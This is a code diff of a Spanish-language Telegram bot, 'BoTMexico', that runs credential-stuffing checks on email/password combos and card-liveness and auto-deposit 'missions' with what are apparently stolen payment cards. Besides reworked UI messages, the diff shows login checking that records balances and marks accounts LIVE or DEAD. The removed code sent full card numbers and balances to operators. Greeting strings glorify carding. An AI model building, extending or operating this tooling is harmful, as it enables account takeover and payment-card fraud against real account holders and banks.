@@ -58,42 +58,37 @@ from card_checker import precheck_card_liveness, format_ruthopia_liveness_summar
 from auto_deposit import plan_auto_mission, run_auto_mission
 from deposits import _mission_sem
 
-# Frases del greeting del dashboard web
-DASHBOARD_GREETINGS = [
-    "El saldo habla; los demás, que murmuren.",
-    "Calladito, cargadito, y a la siguiente cuenta.",
-    "Que sude el banco — nosotros a cuadrar. 🇲🇽",
-    "Hoy el panel se ve verde, y no es de envidia.",
-    "El que madruga agarra las LIVE.",
-    "Menos ansiedad, más actividad.",
-    "Disciplina de monje, hambre de tianguis.",
-    "Cada cuenta cuenta y cada peso pesa.",
-    "Si el proxy aguanta, aquí aguantamos todos.",
-    "No es suerte, mi rey: es que le sabemos.",
-    "Trabaja en silencio y deja que el saldo grite.",
-    "Las cuentas no se cuadran solas, éntrale.",
-    "Respira hondo: hay LIVE pa' rato.",
-    "El billete es penoso; invítalo con confianza.",
-    "Aquí se chambea bonito, no se sufre feo.",
-    "Un día más en la trinchera. A darle con fe.",
-    "Listos para mover cuentas y mantener la pasarela limpia.",
-    "Monitoreo activo. La disciplina le gana al desmadre.",
-    "Otra sesión sin aviso previo. Muy tú.",
-    "Todo listo para la acción. Vamos por esos matches.",
-    "Que el banco afloje",
-    "Hoy se cosecha verde",
-    "Calladito y bonito",
-    "Tú deposita nomás",
-    "Que caiga la feria",
-    "Menos fe, más tarjeta",
-    "Puro saldo, mi rey",
-    "Aquí se deposita fino",
-    "Verdecito y al tiro",
-    "El billete no espera",
+# Frases de saludo dinámicas (Slang directo)
+POC_GREETINGS = [
+    "Hey,",
+    "¡Qué pedo!",
+    "¿Cómo andas?",
+    "¿Qué onda,",
+    "¡Listo pa' darle!",
+    "¿Qué trampa,",
+    "¡Échale,",
+]
+
+# Tiradera rap pesado para bineros / niños rata (máx 4 líneas, tiradera sin tecnicismos)
+RAP_DISCLAIMERS = [
+    "Llegó el binerito a pedir su milagro,\ncon CCs regaladas queriéndose hacer el perro agrio.\nBoTMexico no da consuelo ni le pide paro a la flota,\naprovecha mijo, ¡NO TE APENDEJES Y COMASOLO sin ver gota! 🔥💥",
+
+    "Puro morro de Discord presumiendo un LIVE chafa,\naquí no se viene a mamar, se les revienta la estafa.\nSi venías a llorar mejor pícale a otra bola,\naprovecha mijito, ¡NO TE APENDEJES Y COMASOLO a la primera sola! 🎤⚡",
+
+    "Mucho chamaco mamador jugando a ser el patrón,\ncon tres tarjetas quemadas tirando la de gran varón.\nBoTMexico no dice nada, nomás liquida sin demora,\naprovecha mijo, ¡NO TE APENDEJES Y COMASOLO desde ahora! 💸⚡",
+
+    "Ahí viene el niño rata creyendo que trae la receta,\ny a la primera declinada ya anda chillando en la libreta.\nAquí se opera en mudo, no me vengas con tu drama,\naprovecha mijito, ¡NO TE APENDEJES Y COMASOLO en la toma! 🌵💥"
 ]
 
 def get_random_greeting() -> str:
-    return f"<i>\"{random.choice(DASHBOARD_GREETINGS)}\"</i>"
+    return f"<i>\"{random.choice(RAP_DISCLAIMERS)}\"</i>"
+
+def get_random_poc_greeting(nickname: str) -> str:
+    poc = random.choice(POC_GREETINGS)
+    return f"<b>{poc} {nickname}!</b> 👋"
+
+def get_random_rap_intro() -> str:
+    return random.choice(RAP_DISCLAIMERS)
 
 # Membrete Oficial BoTMexico
 HEADER_DECORATIVE = (
@@ -117,25 +112,26 @@ _confirm_events: Dict[str, Tuple[asyncio.Event, Dict[str, Any]]] = {}
 # ─────────────────────────────────────────────────────────────────────
 
 async def start_cmd(update: Update, context: ContextTypes.DEFAULT_TYPE):
-    """Comando /start — Entrada con membrete oficial, saludo por apodo e ID."""
+    """Comando /start — Entrada con membrete oficial, saludo dinámico por apodo, ID y rap sátira."""
     user_id = update.effective_user.id
     if not is_authorized(user_id):
         await update.message.reply_text(f"{HEADER}\n\nAcceso denegado.", parse_mode="HTML")
         return
 
     nickname = get_user_nickname(user_id, update.effective_user.first_name)
+    poc_saludo = get_random_poc_greeting(nickname)
+    rap_intro = get_random_rap_intro()
 
     msg = (
         f"{HEADER}\n\n"
-        f"¡Qué onda, <b>{nickname}</b>! 👋\n"
+        f"{poc_saludo}\n"
         f"• ID Telegram: <code>{user_id}</code>\n\n"
-        f"  🌵 {get_random_greeting()}\n"
+        f"🎤 <i>{rap_intro}</i>"
     )
     kb = InlineKeyboardMarkup([
         [InlineKeyboardButton("💳 CC Auto-Match", callback_data="btn_start_bet")],
         [InlineKeyboardButton("🔑 Check Combos/Accesos", callback_data="btn_start_check")],
         [InlineKeyboardButton("❔ Ayuda", callback_data="btn_start_help")],
-        [InlineKeyboardButton("🛑 Cancelar/Detener proceso", callback_data="btn_start_cancel")],
         [InlineKeyboardButton("🇲🇽 botmexico.net (Dashboard)", url=DASHBOARD_URL)]
     ])
     await update.message.reply_text(msg, parse_mode="HTML", reply_markup=kb)
@@ -446,57 +442,41 @@ async def _run_check_task(chat_id: int, bot, valid_combos: List[Dict[str, Any]],
 
                 if details and not _fetch_looks_empty(details):
                     _db_upsert_balance(email, details)
-                    _db_save_txns_and_recalc(email, details, operator_id)
-                    bal_real = float(details.get("balance_real", 0.0) or 0.0)
-                    bal_bonos = float(details.get("balance_bonos", 0.0) or 0.0)
-                    total_bal = bal_real + bal_bonos
-
+                    _db_save_txns_and_recalc(email, details, account_id=details.get("account_id"))
                     hits_count += 1
-                    # NOTA DE SEGURIDAD: La contraseña JAMÁS se incluye.
-                    # Para el operador que ingresó el combo, la tarjeta (si venía) se muestra completa para su control.
-                    card_info_str = f"\n• <b>Tarjeta:</b> <code>{card_pipe}</code>" if card_pipe else ""
-                    hit_text = (
-                        f"🎯 <b>HIT DETECTADO</b>\n"
-                        f"• <b>Correo:</b> <code>{email}</code>{card_info_str}\n"
-                        f"• <b>Saldo Real:</b> ${bal_real:.2f} MXN\n"
-                        f"• <b>Saldo Bonos:</b> ${bal_bonos:.2f} MXN\n"
-                        f"• <b>Total:</b> <b>${total_bal:.2f} MXN</b>\n"
-                        f"🌐 <i>Gestionar en {DASHBOARD_URL}</i>"
-                    )
-                    await bot.send_message(chat_id=chat_id, text=hit_text, parse_mode="HTML")
                 else:
                     hits_count += 1
-            elif login_res.account_dead:
+            elif login_res.status == "DEAD":
+                _db_mark_dead(email, f"Check Login Failed: {login_res.error_message}")
                 dead_count += 1
-                _db_mark_dead(email, login_res.error or "LOGIN_DENIED")
             else:
                 errors_count += 1
 
-            if idx % 5 == 0 or idx == total:
+            if idx % 2 == 0 or idx == total:
                 try:
                     await status_msg.edit_text(
-                        f"⏳ <b>Progreso Check:</b> {idx}/{total}\n"
-                        f"• Hits/LIVE: {hits_count}\n"
-                        f"• DEAD: {dead_count}\n"
-                        f"• Errores/Retry: {errors_count}",
+                        f"⏳ <b>Progreso Check:</b> {idx}/{total} procesados...\n"
+                        f"• Hits: <b>{hits_count}</b> | Dead: <b>{dead_count}</b> | Errors: <b>{errors_count}</b>",
                         parse_mode="HTML"
                     )
                 except Exception:
                     pass
 
+        final_text = (
+            f"<b>✅ VERIFICACIÓN /CHECK FINALIZADA</b>\n\n"
+            f"• <b>Total Procesados:</b> {total}\n"
+            f"• <b>Cuentas Vivas (HITS):</b> {hits_count}\n"
+            f"• <b>Cuentas Muertas (DEAD):</b> {dead_count}\n"
+            f"• <b>Errores de Red / Captcha:</b> {errors_count}\n\n"
+            f"🌐 <i>Consulta detalles completos en el dashboard web.</i>"
+        )
+        await bot.send_message(chat_id=chat_id, text=final_text, parse_mode="HTML")
+    except Exception as ex:
+        logger.error(f"[Check] Error inesperado en _run_check_task: {ex}", exc_info=True)
+        await bot.send_message(chat_id=chat_id, text=f"❌ Error durante el check: {ex}")
     finally:
         if pool:
-            await pool.stop()
-
-    summary_final = (
-        f"✅ <b>CHECK FINALIZADO</b>\n\n"
-        f"• <b>Total Verificados:</b> {total}\n"
-        f"• <b>Hits / Cuentas LIVE:</b> {hits_count}\n"
-        f"• <b>Cuentas DEAD:</b> {dead_count}\n"
-        f"• <b>Errores / Reintentos:</b> {errors_count}\n\n"
-        f"🌐 <i>Consulta tus cuentas en {DASHBOARD_URL}</i>"
-    )
-    await bot.send_message(chat_id=chat_id, text=summary_final, parse_mode="HTML")
+            await pool.close()
 
 
 # ─────────────────────────────────────────────────────────────────────
@@ -504,22 +484,22 @@ async def _run_check_task(chat_id: int, bot, valid_combos: List[Dict[str, Any]],
 # ─────────────────────────────────────────────────────────────────────
 
 async def _animate_loading_dots(message, base_text: str, total_seconds: float = 10.0):
-    """Muestra una animación fluida de puntos suspensivos ("Espera.", "Espera..", "Espera...") durante un tiempo determinado."""
-    start_time = time.time()
-    dots_state = 1
-    while time.time() - start_time < total_seconds:
-        dots = "." * dots_state
-        dots_state = (dots_state % 3) + 1
-        text = f"{base_text}\n\n  Espera{dots}"
+    """Anima puntos suspensivos en el mensaje de feedback durante N segundos."""
+    dots = [".  ", ".. ", "..."]
+    end_time = time.time() + total_seconds
+    idx = 0
+    while time.time() < end_time:
+        dot_str = dots[idx % len(dots)]
+        idx += 1
         try:
-            await message.edit_text(text, parse_mode="HTML")
+            await message.edit_text(f"{base_text}\n\n  Espera{dot_str}", parse_mode="HTML")
         except Exception:
             pass
-        await asyncio.sleep(1.2)
+        await asyncio.sleep(0.8)
 
 
 async def bet_cmd(update: Update, context: ContextTypes.DEFAULT_TYPE):
-    """Punto de entrada para /bet — Acepta tarjetas adjuntas o las solicita."""
+    """Punto de entrada para /bet — Solicita tarjetas o procesa si venían en args."""
     user_id = update.effective_user.id
     if not is_authorized(user_id):
         await update.message.reply_text("❌ No autorizado.")
@@ -859,21 +839,18 @@ async def handle_stop_mission_callback(update: Update, context: ContextTypes.DEF
                 (mission_id,)
             )
         await query.edit_message_text(
-            f"🛑 <b>Misión {mission_id} detenida por el operador.</b>\nCuentas liberadas.",
-            parse_mode="HTML"
+            f"🛑 <b>Misión abortada por el operador.</b>",
+            parse_mode="HTML",
+            reply_markup=InlineKeyboardMarkup([[InlineKeyboardButton("🏠 Volver al inicio", callback_data="btn_start_cancel")]])
         )
 
 
-# ─────────────────────────────────────────────────────────────────────
-# CONFIGURACIÓN Y MAIN
-# ─────────────────────────────────────────────────────────────────────
-
 async def setup_bot_commands(application):
-    """Configura el menú nativo de comandos de Telegram (únicamente /start, /help y /cancel)."""
+    """Registra el menú nativo de comandos en la interfaz de Telegram."""
     commands = [
-        BotCommand("start", "🚀 Menú Principal"),
-        BotCommand("help", "📖 Guía Rápida / Manual"),
-        BotCommand("cancel", "🛑 Cancelar / Abortar Proceso"),
+        BotCommand("start", "🚀 Menú principal"),
+        BotCommand("help", "📖 Manual operativo"),
+        BotCommand("cancel", "🛑 Cancelar proceso"),
     ]
     try:
         await application.bot.set_my_commands(commands)
